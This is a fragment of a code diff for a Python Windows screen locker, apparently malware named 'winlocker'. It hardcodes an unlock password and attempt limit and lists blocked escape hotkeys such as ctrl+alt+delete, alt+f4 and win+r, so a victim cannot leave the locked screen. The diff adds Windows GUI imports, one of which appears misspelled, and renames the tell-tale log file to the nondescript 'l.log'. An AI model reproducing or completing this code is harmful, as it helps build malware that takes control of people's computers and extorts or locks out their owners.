@@ -1,9 +1,11 @@
 import pygame
 import time 
 import keyboard
+import win32gui 
+import wincon
 PASSWORD = "90481"
 MAX_ATTEMPTS = 3
-LOG_FILE = "winlocker.log"
+LOG_FILE = "l.log"
 BLOCKED = ["alt+f4","alt+tab","alt+esc","alt+space",
     "ctrl+esc","ctrl+shift+esc","ctrl+alt+delete",
     "win","win+d","win+r","win+l","win+tab","win+e",
